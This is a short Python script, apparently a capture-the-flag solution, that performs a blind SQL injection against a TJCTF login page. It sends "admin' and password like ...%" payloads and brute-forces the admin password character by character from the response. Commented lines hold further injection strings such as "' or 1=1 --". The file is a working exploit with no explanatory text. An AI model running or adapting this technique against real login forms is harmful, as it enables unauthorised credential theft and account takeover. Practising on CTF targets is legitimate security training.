import requests
# characters = ['0','1','2','3','4','5','6','7','8','9','a','b','c','d','e','f','g','h','i','j','k','l','m','n','o','p','q','r','s','t','u','v','w','x','y','z','A','B','C','D','E','F','G','H','I','J','K','L','M','N','O','P','Q','R','S','T','U','V','W','X','Y','Z'][::-1]
from string import printable, ascii_lowercase, digits

characters = list(ascii_lowercase + digits)


i = 0
pattern = characters[0]

host = "https://weak_password.tjctf.org/login"

while True:
    params = {'username':'''admin\' and password like "{}%" -- \' '''.format(pattern),'password':'admin'}
    natas15 = requests.post(host, data=params)
    ans = natas15.text[1732:1733]
    print(pattern)
    # print(ans)
    if ans != 'S':
        i = 0
        pattern += characters[i]
    else:
        i += 1
        pattern = pattern[:-1] + characters[i%62]
    

# \' or 1=2 -- \'
# params = {'password':'''\' or 1=1 -- \'''','username':'admin'}
# params = {'password':'''lol''','username':'admin'}
# natas15 = requests.post(host, data=params)
# print(natas15.text[1732:1733])
# print(natas15.text)